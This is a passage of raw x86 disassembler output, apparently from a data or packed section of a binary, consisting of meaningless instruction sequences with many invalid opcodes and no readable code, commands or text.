  426ce5:	xor    eax,DWORD PTR [edi]
  426ce7:	mov    ch,0xd9
  426ce9:	(bad)  
  426cea:	sbb    al,0xca
  426cec:	loop   0x426cab
  426cee:	fwait
  426cef:	xchg   edi,eax
  426cf0:	sahf   
  426cf1:	ret    0x315b
  426cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cf5:	in     eax,dx
  426cf6:	shl    BYTE PTR [ecx+0xc900e10],1
  426cfc:	xor    eax,0xe6a40c37
  426d01:	fstp   QWORD PTR [ebp-0x37]
  426d04:	ds dec esp
  426d06:	pusha  
  426d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d08:	jge    0x426d48
  426d0a:	outs   dx,DWORD PTR ds:[esi]
  426d0b:	shr    BYTE PTR [edi],0xee
  426d0e:	mov    eax,0x8919add9
  426d13:	faddp  st(4),st
  426d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d16:	sbb    BYTE PTR [ebx+edx*1],bl
  426d19:	test   ecx,esp
  426d1b:	pop    ebx
  426d1c:	and    BYTE PTR [ebx-0x7ceaea08],ah
  426d22:	js     0x426cb0
  426d24:	mov    eax,0xb7eea7cf
  426d29:	(bad)  
  426d2a:	(bad)  
  426d2c:	mov    ebx,0x3bf0cfc9
  426d31:	(bad)  
  426d33:	out    0xf9,eax
  426d35:	push   ecx
  426d36:	adc    ecx,DWORD PTR [ecx]
  426d38:	repz mov esi,0x9e7dc299
  426d3e:	add    al,dh
  426d40:	div    DWORD PTR [edi-0x5f79bf24]
  426d46:	arpl   WORD PTR [ecx],si
  426d48:	sar    DWORD PTR [esi],cl
  426d4a:	je     0x426cfe
  426d4c:	bound  eax,QWORD PTR [edi]
  426d4e:	mov    dl,0x48
  426d50:	or     dl,bl
  426d52:	xchg   ebx,eax
  426d53:	aam    0x75
  426d55:	and    edi,eax
  426d57:	aaa    
  426d58:	in     al,dx
  426d59:	lods   al,BYTE PTR ds:[esi]
  426d5a:	test   eax,0xdfc60e16
  426d5f:	xchg   esp,eax
  426d60:	out    dx,al
  426d61:	and    eax,0x2e093a98
  426d66:	pop    ebp
  426d67:	cwde   
  426d68:	jnp    0x426dc8
  426d6a:	xchg   esi,eax
  426d6b:	adc    al,0xcb
  426d6e:	xor    ebp,DWORD PTR [ebx]
  426d70:	enter  0x8934,0x23
  426d74:	jmp    0x50f256db
  426d79:	out    0xd1,al
  426d7b:	add    ebx,ebp
  426d7d:	sub    eax,0xb0820b6b
  426d82:	outs   dx,BYTE PTR ds:[esi]
  426d83:	adc    DWORD PTR [ebp+0xd],0x87a0f3e1
  426d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d8b:	push   eax
  426d8c:	shl    BYTE PTR [esi+0x4b497f],1
	...
  426df2:	add    BYTE PTR [eax],al
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0xe10c:0xc7c2ecf9
  426e01:	pop    ds
  426e02:	xor    DWORD PTR [ebx+0x19fce],edi
  426e08:	add    eax,0xaf000001
  426e0d:	mov    ch,0xd2
  426e0f:	cs mov ecx,0xf6fe4037
  426e15:	shl    DWORD PTR es:[esi],0x84
  426e19:	out    0x33,al
  426e1b:	mov    cl,0x18
  426e1d:	push   ds
  426e1e:	adc    BYTE PTR [esi],0xc2
  426e21:	fbld   TBYTE PTR [ebx+0x3d]
  426e24:	sub    DWORD PTR ds:0x6478d0bd,ebp
  426e2a:	int3   
  426e2b:	xchg   ebx,eax
  426e2c:	xor    ebx,DWORD PTR [edx+0x2f]
  426e2f:	sub    DWORD PTR [ebp+eiz*4-0x361780e],0xc1b31ee3
  426e3a:	xchg   BYTE PTR [edx+0x1c592d00],bl
  426e40:	outs   dx,BYTE PTR ds:[esi]
  426e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e42:	retf   
  426e43:	and    DWORD PTR [ecx-0x6c0d1df9],ebx
  426e49:	xchg   edx,eax
  426e4a:	into   
  426e4b:	xor    ah,bh
  426e4d:	mov    edx,0x2ad2a22e
  426e52:	dec    edx
  426e53:	inc    esi
  426e54:	in     eax,dx
  426e55:	clts   
  426e57:	imul   edx,DWORD PTR [ebx-0x2e],0x24
  426e5b:	in     eax,0xb3
  426e5d:	imul   ebx,eax,0xffffffcc
  426e60:	pushf  
  426e61:	sub    BYTE PTR [edi],dl
  426e63:	shl    DWORD PTR ds:[ecx+0x8],0x54
  426e68:	(bad)
  426e6b:	in     eax,dx
  426e6c:	sar    BYTE PTR [edx+ebx*1],0xf5
  426e70:	aaa    
  426e71:	or     eax,0x2865d7f9
  426e76:	mov    ah,0x7d
  426e78:	mov    eax,0xbb80bb89
  426e7d:	inc    ebp
  426e7e:	icebp  
  426e7f:	popa   
  426e80:	inc    eax
  426e81:	repz inc ecx
  426e83:	mov    bl,BYTE PTR [ecx+0x66]
  426e86:	xchg   ebx,eax
  426e87:	fcomp  st(1)
  426e89:	mov    dl,0x28
  426e8b:	das    
  426e8c:	sahf   
  426e8d:	xor    al,0xb7
  426e8f:	dec    edx
  426e90:	imul   ebx,ebx,0x3b
  426e93:	push   ss
  426e94:	icebp  
  426e95:	js     0x426efb
  426e97:	cmp    eax,0x8aa7fa
  426e9c:	(bad)  
  426e9d:	push   ebp
  426e9e:	mov    bl,0x46
  426ea0:	xor    al,0x24
  426ea2:	imul   edx,esp,0xb3202bed
  426ea8:	and    eax,0x5abd7b13
  426ead:	das    
  426eae:	sti    
  426eaf:	sbb    DWORD PTR [ebx+0x7c],edx
  426eb2:	inc    esi
  426eb3:	inc    ebx
  426eb4:	test   al,0xdb
  426eb6:	inc    edi
  426eb7:	dec    ebx
  426eb8:	push   esp
  426eb9:	cld    
  426eba:	sub    esp,edi
  426ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ebd:	jno    0x426efc
  426ebf:	arpl   WORD PTR [esi],dx
  426ec1:	(bad)  
  426ec2:	das    
  426ec3:	retf   
  426ec4:	or     eax,DWORD PTR [ebp+eax*4+0x78fe8e75]
  426ecb:	or     BYTE PTR [eax+0x629ae0ad],0x9f
  426ed2:	shl    DWORD PTR [ebx-0x5fbd1ee1],cl
  426ed8:	add    bh,BYTE PTR [edx+eiz*2-0x69]
  426edc:	arpl   bp,ax
  426ede:	fwait
  426edf:	rcr    dl,1
  426ee1:	add    DWORD PTR [edx],edx
  426ee3:	loopne 0x426ea2
  426ee5:	inc    edx
  426ee6:	into   
  426ee7:	call   0x782a:0x7139d839
  426eee:	mov    edi,DWORD PTR [eax-0x62c31f01]
  426ef4:	pop    esi
  426ef5:	pop    esp
  426ef6:	dec    ebx
  426ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ef8:	sbb    DWORD PTR [edi-0x3d],ebp
  426efb:	jl     0x426f04
  426efd:	pop    ss
  426efe:	out    0x11,eax
  426f00:	retf   0xbb6c
  426f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f04:	xchg   ebp,eax
  426f05:	mov    eax,0xad676f5b
  426f0a:	lock leave 
  426f0c:	aaa    
  426f0d:	mov    BYTE PTR [ebx+0x6629],bh
	...
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [esi+ebp*1-0x2ca22fd8],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	rcr    BYTE PTR [ecx-0x4a27cd6e],cl
  426f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f93:	mov    dl,0x34
  426f95:	sbb    dh,BYTE PTR [ecx+ebx*4-0x260d3824]
  426f9c:	int3   
  426f9d:	bound  ebx,QWORD PTR [edx+0x7f468fe5]
  426fa3:	repz aad 0x4e
  426fa6:	nop
  426fa7:	retf   
  426fa8:	mov    ecx,0x688aecea
  426fad:	sub    BYTE PTR [eax-0x384fe68b],ch
  426fb3:	sbb    al,0x9b
  426fb5:	mov    eax,ds:0xad239720
  426fba:	fild   WORD PTR [edx+eax*2+0x4cae59e3]
  426fc1:	dec    esp
  426fc2:	sbb    al,0xe6
  426fc4:	cld    
  426fc5:	test   BYTE PTR [eax],ah
  426fc7:	out    0x70,eax
  426fc9:	adc    BYTE PTR [edi-0xe],bl
  426fcc:	outs   dx,BYTE PTR ds:[esi]
  426fce:	das    
  426fcf:	inc    esi
  426fd0:	adc    eax,0x3a8cb5d0
  426fd5:	push   eax
  426fd6:	adc    al,0x65
  426fd8:	mov    bl,0x65
  426fda:	ret    0x508f
  426fdd:	jge    0x426f99
  426fdf:	push   0x2f
  426fe1:	add    DWORD PTR [edi-0x76],eax
  426fe4:	add    ebp,DWORD PTR [ebp-0x10]
  426fe7:	mov    edi,0x4eb19a33
  426fec:	mov    eax,DWORD PTR [ebp-0x9dd0637]
  426ff2:	add    cl,BYTE PTR [ebx+0x1c]
  426ff5:	retf   0x1f0d
  426ff8:	or     al,0x2c
  426ffa:	and    DWORD PTR [ebx-0x4d],ebx
  426ffd:	cmp    BYTE PTR [ecx],0x67
  427000:	(bad)  
  427001:	fldenv [ecx+edi*8+0x31]
  427005:	retf   0x631d
  427008:	xor    BYTE PTR [edx],0xec
  42700b:	mov    eax,0x29db2df4
  427010:	jg     0x426ff1
  427012:	pop    ebp
  427013:	jmp    0xb6f9:0xc10767e1
  42701a:	leave  
  42701b:	call   0xf43fb4ca
  427020:	pushf  
  427021:	mov    ch,0x4b
  427023:	cld    
  427024:	sar    DWORD PTR [ebx],0x1a
  427027:	add    al,0x71
  427029:	xchg   edi,eax
  42702a:	popw   es
  42702c:	add    ebp,DWORD PTR [edi+0x67a9a817]
  427032:	sahf   
  427033:	out    dx,eax
  427034:	mov    ecx,0x164eec54
  427039:	mov    ebp,0xd13cb925
  42703e:	cli    
  42703f:	in     al,dx
  427040:	aaa    
  427041:	int3   
  427042:	out    dx,eax
  427043:	adc    edx,DWORD PTR [esi-0x7c]
  427046:	js     0x426fe8
  427048:	pushf  
  427049:	jp     0x427063
  42704b:	cmc    
  42704c:	sti    
  42704d:	or     bh,BYTE PTR [ebp-0x41]
  427050:	sub    edi,esp
  427052:	test   eax,0x2ae8529a
  427057:	mov    eax,ds:0x990271c0
  42705c:	mov    DWORD PTR [ecx],eax
  42705e:	add    DWORD PTR [ecx],0xffffff82
  427061:	nop
  427062:	mov    cs,WORD PTR [ebp+0x73]
  427065:	xor    al,0x1e
  427067:	gs and edi,eax
  42706a:	fcom   QWORD PTR [ebx-0x272711af]
  427070:	in     eax,dx
  427071:	lea    edx,[esi-0x4a]
  427074:	mov    bl,0x7b
  427076:	cwde   
  427077:	add    BYTE PTR [edx+ebx*8-0x5c49c83e],ah
  42707e:	int3   
  42707f:	mov    cl,0xd7
  427081:	loope  0x427071
  427083:	inc    ebp
  427084:	mov    edx,0xe0f060d1
  427089:	dec    esp
  42708a:	sub    bh,BYTE PTR ds:0xafbd85f2
  427090:	sub    DWORD PTR [eax],eax
	...
  4270f2:	add    BYTE PTR [eax],al
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x5c579d96
  427102:	lock aas 
  427104:	fsub   DWORD PTR [ecx+0x1050001]
  42710a:	add    BYTE PTR [eax],al
  42710c:	mov    ebp,0xb45e0521
  427111:	xchg   DWORD PTR [ebx],ebx
  427113:	dec    edi
  427114:	fisubr DWORD PTR ss:[ebp+0x2326dfe]
  42711b:	or     al,0xd8
  42711d:	jne    0x427189
  42711f:	in     al,0xb5
  427121:	sub    BYTE PTR [edi+0x3c2deb45],0xc3
  427128:	ret    0x35d5
  42712b:	popa   
  42712c:	into   
  42712d:	mov    dl,BYTE PTR [edi+0x6458e107]
  427133:	fs dec ebx
  427135:	pmulhuw mm2,QWORD PTR [eax-0x50346cc4]
  42713c:	sub    BYTE PTR [esi],ch
  42713e:	jmp    0xa645e63d
  427143:	data16 sbb bl,BYTE PTR [esi+eax*8]
  427147:	shl    ch,1
  427149:	xor    BYTE PTR [edx+0x18],ah
  42714c:	cmp    BYTE PTR [ebx-0x74f18e7f],ah
  427152:	cld    
  427153:	push   edx
  427154:	or     eax,0xfd1130f7
  427159:	in     eax,dx
  42715a:	push   ss
  42715b:	ja     0x427191
  42715d:	shr    DWORD PTR [eax+edx*8-0x48],cl
  427161:	fucomip st,st(6)
  427163:	and    DWORD PTR [edx],ecx
  427165:	das    
  427166:	rol    DWORD PTR [ecx-0x5495b0c3],1
  42716c:	cmp    esi,eax
  42716e:	aam    0xe4
  427170:	leave  
  427171:	pop    edx
  427172:	aam    0xe
  427174:	inc    esp
  427175:	in     al,0x8a
  427177:	pop    esi
  427178:	jae    0x4271be
  42717a:	popf   
  42717b:	pop    edi
  42717c:	shl    BYTE PTR [edi+0xa4fb8e5],1
  427182:	xchg   ebp,eax
  427183:	push   ebx
  427184:	inc    ebp
  427185:	std    
  427186:	pop    ebp
  427187:	shr    esi,1
  427189:	mov    ebp,0x7769467c
  42718e:	test   al,0x51
  427190:	or     eax,0x4fb24413
  427195:	and    eax,0x1c6aea2f
  42719a:	mov    ecx,0x91bd65d6
  42719f:	jp     0x4271c2
  4271a1:	cld    
  4271a2:	jle    0x4271ba
  4271a4:	cmp    edi,DWORD PTR [eax]
  4271a6:	scas   al,BYTE PTR es:[edi]
  4271a7:	push   eax
  4271a8:	xor    al,0x1b
  4271aa:	xchg   esi,eax
  4271ab:	pop    ecx
  4271ac:	jne    0x42713b
  4271ae:	into   
  4271af:	push   cs
  4271b0:	xor    BYTE PTR [edx+0x8],bh
  4271b3:	inc    ebp
  4271b4:	gs sti 
  4271b6:	cmc    
  4271b7:	rcl    DWORD PTR [eax],cl
  4271b9:	push   ds
  4271ba:	(bad)  
  4271bb:	cmp    dh,BYTE PTR [edi+ecx*2+0x1e]
  4271bf:	mov    cl,0x91
  4271c1:	add    edx,ebp
  4271c3:	ret    
  4271c4:	nop    DWORD PTR [edx+0x3a5466a4]
  4271cb:	jb     0x42723c
  4271cd:	retf   
  4271ce:	dec    edx
  4271cf:	lds    esp,FWORD PTR [edx+0x42922753]
  4271d5:	loope  0x427185
  4271d7:	jmp    0x226fc7e0
  4271dc:	jns    0x42725a
  4271de:	xor    BYTE PTR [edx+eax*2],ch
  4271e1:	mov    cl,0x84
  4271e3:	dec    edi
  4271e4:	loopne 0x4271db
  4271e6:	out    dx,al
  4271e7:	push   ebx
  4271e8:	lods   al,BYTE PTR ds:[si]
  4271ea:	ss mov esp,ebp
  4271ed:	fcomp  QWORD PTR [ecx]
  4271ef:	dec    ebx
  4271f0:	dec    ebp
  4271f1:	vpsubb ymm4,ymm3,YMMWORD PTR [ecx+0x30]
  4271f6:	jbe    0x427270
  4271f8:	dec    esp
  4271f9:	(bad)  
  4271fb:	test   BYTE PTR [ecx],bh
  4271fd:	mov    ds:0xee91c798,al
  427202:	xchg   esi,eax
  427203:	mov    al,0x2b
  427205:	cld    
  427206:	test   DWORD PTR [edi],edi
  427208:	aas    
  427209:	xchg   BYTE PTR [ebx+eax*4],al
  42720c:	(bad)  
  42720d:	xchg   BYTE PTR [ebx],al
  42720f:	shr    BYTE PTR [eax+eax*1+0x0],cl
	...
  427272:	add    BYTE PTR [eax],al
  427274:	push   ds
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x710f242f,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	das    
  42728d:	pushf  
  42728e:	adc    al,0x7b
  427290:	mov    ecx,0xd21aa7e7
  427295:	mov    ecx,0x82498f92
  42729a:	pop    ss
  42729b:	into   
  42729c:	and    al,0x70
  42729e:	inc    ebx
  42729f:	aaa    
  4272a0:	cmc    
  4272a1:	or     ch,BYTE PTR [edx+0x76]
  4272a4:	jnp    0x42724e
  4272a6:	or     BYTE PTR [edx+edi*2],cl
  4272a9:	sub    ebp,DWORD PTR [esi-0x1]
  4272ac:	push   ss
  4272ad:	push   es
  4272ae:	jbe    0x4272ef
  4272b0:	pop    ebx
  4272b1:	mov    cl,0xd1
  4272b3:	inc    esp
  4272b4:	aad    0x5a
  4272b6:	cmp    dl,ah
  4272b8:	jg     0x427291
  4272ba:	jle    0x42727e
  4272bc:	inc    edx
  4272bd:	call   0x9636:0x20b5ae9f
  4272c4:	outs   dx,BYTE PTR ds:[esi]
  4272c5:	push   ds
  4272c6:	xor    eax,DWORD PTR [edi+0xb]
  4272c9:	xor    eax,0x40803d24
  4272ce:	push   edi
  4272cf:	pop    ss
  4272d0:	mov    ah,BYTE PTR [edi]
  4272d2:	push   eax
  4272d3:	mov    eax,ds:0x69f6b071
  4272d8:	jmp    0xef9a3498
  4272dd:	sub    al,0xa2
  4272df:	jne    0x4272e0
  4272e1:	test   eax,0xf4b605ce
  4272e6:	jle    0x427269
  4272e8:	xchg   esp,eax
  4272e9:	hlt    
  4272ea:	mov    ds:0xbb9c4026,al
  4272ef:	lds    eax,FWORD PTR [edi+ebp*2+0x3]
  4272f3:	fisubr WORD PTR [ebx]
  4272f5:	jo     0x42728f
  4272f7:	jge    0x42730b
  4272f9:	adc    eax,DWORD PTR [ebx-0x266e3509]
  4272ff:	jmp    0x97c78ef7
  427304:	shl    BYTE PTR [ecx+0x490bef4e],0x19
  42730b:	jmp    0x4272a4
  42730d:	adc    BYTE PTR [esi+0x2c],cl
  427310:	pop    ds
  427311:	in     al,0xdd
  427313:	push   0x51
  427315:	dec    ebx
  427316:	mov    ds:0xd2708edd,eax
  42731b:	es jmp 0x1cf3:0x867f2b3
  427323:	dec    eax
  427324:	in     al,0x41
  427326:	inc    eax
  427327:	mov    ch,0x3b
  427329:	stc    
  42732a:	ins    DWORD PTR es:[edi],dx
  42732b:	mov    eax,ds:0x50aae2ae
  427330:	fcomi  st,st(4)
  427332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427333:	dec    BYTE PTR [ebx+ecx*2-0x30]
  427337:	ins    BYTE PTR es:[edi],dx
  427338:	push   ebp
  427339:	push   ebp
  42733a:	cdq    
  42733b:	mov    ebx,0x66721cf4
  427340:	mov    esp,0x800442ad
  427345:	sahf   
  427346:	xchg   esp,eax
  427347:	dec    esp
  427348:	pusha  
  427349:	sbb    eax,DWORD PTR [ebp+0x1f]
  42734c:	jae    0x427333
  42734e:	mov    esp,0x30ceeae1
  427353:	and    al,0x11
  427355:	push   0xffffff96
  427357:	sub    al,0x1d
  427359:	pusha  
  42735a:	fs pop edi
  42735c:	inc    ebp
  42735d:	(bad)
  427361:	or     edi,DWORD PTR [ebp-0x74]
  427364:	push   ecx
  427365:	shr    BYTE PTR [edi],cl
  427367:	jg     0x4273a0
  427369:	sbb    esi,DWORD PTR [esi+0x46]
  42736c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42736d:	or     dh,BYTE PTR [ebx]
  42736f:	xlat   BYTE PTR ds:[ebx]
  427370:	imul   esi,DWORD PTR [eax+0x5c],0xffffffe0
  427374:	out    0x62,al
  427376:	fnsave [ebx+0x17ea4d25]
  42737c:	ret    0xb82e
  42737f:	mul    DWORD PTR [eax+0x59]
  427382:	xchg   ebp,eax
  427383:	mov    ch,0xee
  427385:	sbb    BYTE PTR [edi-0xc594d25],ah
  42738b:	out    0xd9,al
  42738d:	scas   eax,DWORD PTR es:[edi]
  42738e:	sbb    DWORD PTR [esi+esi*2],eax
	...
  4273f1:	add    BYTE PTR [eax],al
  4273f3:	add    BYTE PTR [edx],dl
  4273f5:	sbb    eax,0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    esi,DWORD PTR [eax+eax*4-0x5c1d04ec]
  427406:	add    DWORD PTR [eax],eax
  427408:	add    eax,0x61000001
  42740d:	push   ecx
  42740e:	add    edx,DWORD PTR [ebx+0x299af49a]
  427414:	and    al,0x37
  427416:	(bad)  
  427417:	(bad)  
  427418:	out    dx,al
  427419:	mov    ebx,0x84e15ca5
  42741e:	mov    ebp,0xd666f56e
  427423:	mov    ecx,0xaef0abde
  427428:	mov    ebx,0xaa7eda64
  42742d:	je     0x4273e3
  42742f:	and    bl,ch
  427431:	iret   
  427432:	in     al,0x4d
  427434:	mov    BYTE PTR [ecx+eiz*2],ah
  427437:	cli    
  427438:	inc    ecx
  427439:	sti    
  42743a:	mov    ch,0xeb
  42743c:	pop    ecx
  42743d:	inc    edi
  42743e:	fnstenv [eax+0x78626864]
  427444:	cli    
  427445:	xchg   edi,eax
  427446:	add    al,BYTE PTR [ebx-0x6b]
  427449:	call   FWORD PTR [edi-0x709cbc70]
  42744f:	cli    
  427450:	or     al,0x83
  427452:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  427454:	xchg   esi,eax
  427455:	jne    0x427474
  427457:	sti    
  427458:	(bad)  
  427459:	retf   
  42745a:	daa    
  42745b:	pushf  
  42745c:	sub    ebp,DWORD PTR [edx+0x7117f205]
  427462:	pop    es
  427463:	mov    dh,0xbc
  427465:	sbb    al,0xcf
  427467:	(bad)  
  427468:	out    0xd8,al
  42746a:	and    esi,DWORD PTR [esi+0x3c]
  42746d:	popa   
  42746e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42746f:	mov    ebp,0x2b0c0085
  427474:	lahf   
  427475:	dec    ebp
  427476:	ficomp DWORD PTR [ebp+0x6b]
  427479:	repz and ecx,eax
  42747c:	inc    ecx
  42747d:	inc    eax
  42747e:	inc    eax
  42747f:	and    eax,0x1511b5be
  427484:	loopne 0x427419
  427486:	sbb    eax,0x2942158e
  42748b:	pop    esi
  42748c:	out    0x84,al
  42748e:	add    BYTE PTR [edi],0xdf
  427491:	inc    edx
  427492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427493:	mov    ch,0xee
  427495:	xchg   ebx,eax
  427496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427497:	repnz (bad) 
  42749a:	dec    eax
  42749b:	imul   edx,DWORD PTR [edi-0x76],0xffffffed
  42749f:	adc    BYTE PTR [ebx+0x3c9694f7],dl
  4274a5:	mov    bh,0x69
  4274a7:	push   0xfffffff6
  4274a9:	lds    edx,FWORD PTR ds:0x3b7e0cdb
  4274af:	or     al,0x7
  4274b1:	add    al,0x87
  4274b3:	sub    DWORD PTR [edx],0x43cfe3ed
  4274b9:	lds    esi,FWORD PTR [edi+0x5987fd13]
  4274bf:	(bad)  
  4274c1:	xchg   ebx,eax
  4274c2:	xchg   edx,eax
  4274c3:	xchg   ebp,eax
  4274c4:	fadd   DWORD PTR [ebx+0x5d]
  4274c7:	inc    edi
  4274c8:	sbb    BYTE PTR ds:0xe829bbab,dl
  4274ce:	cmp    BYTE PTR [ebp-0x12db26d2],al
  4274d4:	test   ah,0xcd
  4274d7:	jp     0x427511
  4274d9:	test   BYTE PTR [ebx],bl
  4274db:	cmp    ch,BYTE PTR [edx]
  4274dd:	fcomp  st(3)
  4274df:	loopne 0x427513
  4274e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274e2:	call   0xf2f46f7
  4274e7:	add    BYTE PTR [edx+ebp*4-0x49],dl
  4274eb:	sbb    al,0x57
  4274ed:	sub    edx,DWORD PTR gs:[ebx+0x3bcf4029]
  4274f4:	jl     0x427528
  4274f6:	mov    al,ds:0xaf1fc533
  4274fb:	fsub   DWORD PTR [ebx-0x1174f973]
  427501:	sti    
  427502:	pop    esp
  427503:	jmp    0xc471:0x46a8f215
  42750a:	scas   al,BYTE PTR es:[edi]
  42750b:	ret    
  42750c:	sub    BYTE PTR [esi+0x31],0x33
  427510:	outs   dx,DWORD PTR ds:[esi]
	...
  427571:	add    BYTE PTR [eax],al
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	stos   DWORD PTR es:[edi],eax
  427581:	data16 (bad) [ecx+0x1a4e7]
  427588:	add    eax,0xfa000001
  42758d:	mov    ebp,0x27793d35
  427592:	add    al,0xf0
  427594:	sub    bl,BYTE PTR [edx-0x9547a9f]
  42759a:	jle    0x42752b
  42759c:	cmc    
  42759d:	jno    0x427552
  42759f:	frstor [ebx]
  4275a1:	xchg   esp,eax
  4275a2:	aas    
  4275a3:	jb     0x42756c
  4275a5:	adc    BYTE PTR [ecx-0xa],dh
  4275a8:	sub    al,0xe1
  4275aa:	ins    BYTE PTR es:[edi],dx
  4275ab:	stos   BYTE PTR es:[edi],al
  4275ac:	xchg   edx,eax
  4275ad:	mov    al,ds:0xbb9ca099
  4275b2:	pcmpeqb mm3,QWORD PTR [eax-0x1d]
  4275b6:	jno    0x42760f
  4275b8:	mov    edi,0xf631781c
  4275bd:	outs   dx,DWORD PTR ds:[esi]
  4275be:	ds mov bh,0x4e
  4275c1:	mov    ebp,0x4ceff8fa
  4275c6:	mov    WORD PTR es:[edi-0x627802c6],cs
  4275cd:	rcl    DWORD PTR [edi+0x21d20fd3],1
  4275d3:	push   esp
  4275d4:	sbb    al,0xaa
  4275d6:	mov    bl,0x23
  4275d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275d9:	cld    
  4275da:	nop
  4275db:	or     cl,bl
  4275dd:	pop    ds
  4275de:	outs   dx,DWORD PTR ds:[esi]
  4275df:	dec    ebx
  4275e0:	xchg   DWORD PTR [ebp+0x63529809],ebx
  4275e6:	popa   
  4275e7:	std    
  4275e8:	jle    0x4275f8
  4275ea:	sbb    al,0xa9
  4275ec:	xchg   ebp,eax
  4275ed:	sbb    eax,0xdddaf41a
  4275f2:	pop    ss
  4275f3:	addr16 mov ebx,0xedb54b14
  4275f9:	daa    
  4275fa:	mov    cl,0x8f
  4275fc:	or     ch,cl
  4275fe:	ret    0x6e01
  427601:	pop    es
  427602:	dec    ebx
  427603:	push   eax
  427604:	cmc    
  427605:	inc    edx
  427606:	xlat   BYTE PTR ds:[ebx]
  427607:	push   cs
  427608:	es (bad) 
  42760a:	scas   eax,DWORD PTR es:[edi]
  42760b:	pushf  
  42760c:	rcl    DWORD PTR [ecx+0x59],0x4e
  427610:	sub    eax,0x120471a0
  427615:	push   ebx
  427616:	popa   
  427617:	jle    0x427694
  427619:	jge    0x427629
  42761b:	xor    BYTE PTR [ecx],cl
  42761d:	jecxz  0x4275a5
  42761f:	and    eax,0x885b99e8
  427624:	in     eax,dx
  427625:	inc    ebp
  427626:	das    
  427627:	(bad)  [ebx]
  427629:	push   eax
  42762a:	or     DWORD PTR [ebp-0x7da229fd],edx
  427630:	frstor [ebx-0x2]
  427633:	and    cl,al
  427635:	aas    
  427636:	dec    ebp
  427637:	cs push 0x60
  42763a:	loop   0x4275c2
  42763c:	pushf  
  42763d:	into   
  42763e:	inc    esi
  42763f:	dec    ecx
  427640:	out    dx,al
  427641:	lock ins BYTE PTR es:[edi],dx
  427643:	mov    esp,0x1d022417
  427648:	xor    dx,ax
  42764b:	in     al,dx
  42764c:	sub    bl,BYTE PTR [edx+edi*8-0x5cbf44ce]
  427653:	mov    cl,0xe1
  427655:	jae    0x4275e4
  427657:	dec    esi
  427658:	adc    eax,0x686a2c4f
  42765d:	mov    DWORD PTR [ecx+0x32],ecx
  427660:	xlat   BYTE PTR ds:[ebx]
  427661:	pshufw mm2,QWORD PTR [esi-0x4b],0x28
  427666:	cli    
  427667:	jmp    0x4276a3
  427669:	sahf   
  42766a:	cmp    al,0x88
  42766c:	xchg   DWORD PTR [ebp+0x33e3bb5c],ecx
  427672:	cli    
  427673:	inc    ebp
  427674:	into   
  427675:	pop    ebx
  427676:	(bad)  
  427677:	jb     0x42765d
  427679:	xchg   BYTE PTR [edi],dh
  42767b:	outs   dx,BYTE PTR ds:[esi]
  42767c:	fcom   QWORD PTR [ebx+edx*4]
  42767f:	jg     0x4276f5
  427681:	cdq    
  427682:	push   0x87204664
  427687:	mov    bl,dl
  427689:	loopne 0x4276fb
  42768b:	add    bl,BYTE PTR [ecx+eiz*4-0x10]
  42768f:	daa    
  427690:	cwde   
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	(bad)  
  427701:	jns    0x4276a7
  427703:	cmp    ch,ah
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0x6b000001
  42770d:	add    esp,DWORD PTR [edx+eax*2]
  427710:	jbe    0x42776e
  427712:	aad    0xdb
  427714:	es lahf 
  427716:	jns    0x427742
  427718:	mov    esi,0xe4430547
  42771d:	inc    edx
  42771e:	sub    eax,0x5b214743
  427723:	sub    BYTE PTR [ebx],ch
  427725:	and    al,0xb6
  427727:	mov    edx,0x1d473b05
  42772c:	and    ah,BYTE PTR [edx-0x7b]
  42772f:	pusha  
  427730:	mov    ds:0x7b64d095,al
  427735:	and    al,0xc2
  427737:	xchg   ebp,eax
  427738:	out    dx,eax
  427739:	daa    
  42773a:	stos   DWORD PTR es:[edi],eax
  42773b:	adc    edi,DWORD PTR [edi]
  42773d:	outs   dx,BYTE PTR ds:[esi]
  42773e:	lahf   
  42773f:	lods   eax,DWORD PTR ds:[esi]
  427740:	jnp    0x42772e
